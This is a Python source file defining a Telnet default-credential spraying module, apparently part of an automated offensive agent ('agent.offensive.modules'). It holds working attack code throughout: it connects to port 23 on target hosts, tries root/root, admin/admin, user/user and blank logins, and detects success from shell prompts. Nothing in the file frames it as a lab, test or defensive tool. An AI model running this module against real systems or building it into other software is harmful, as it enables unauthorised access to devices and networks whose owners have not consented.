"""Telnet default credential spray."""

from __future__ import annotations

import socket
import time
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

CREDS: Sequence[Tuple[str, str]] = (
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("", ""),
)


class TelnetDefaultsModule(ExploitModule):
    name = "telnet_defaults"
    ports = (23,)

    def run(self, host: HostHit) -> bool:
        if 23 not in host.open_ports:
            return False
        for user, password in CREDS:
            if self._try_login(host.ip, user, password):
                return True
        return False

    def _try_login(self, ip: str, user: str, password: str) -> bool:
        try:
            with socket.create_connection((ip, 23), timeout=3.0) as sock:
                sock.settimeout(2.0)
                data = sock.recv(256).decode(errors="ignore")
                if "login" in data.lower() or "username" in data.lower():
                    sock.sendall((user + "\n").encode())
                    time.sleep(0.3)
                    sock.recv(256)
                    sock.sendall((password + "\n").encode())
                    time.sleep(0.4)
                    resp = sock.recv(512).decode(errors="ignore").lower()
                    if any(x in resp for x in ("$", "#", "last login", "welcome")):
                        return True
                    if "incorrect" in resp or "failed" in resp or "denied" in resp:
                        return False
        except OSError:
            return False
        return False
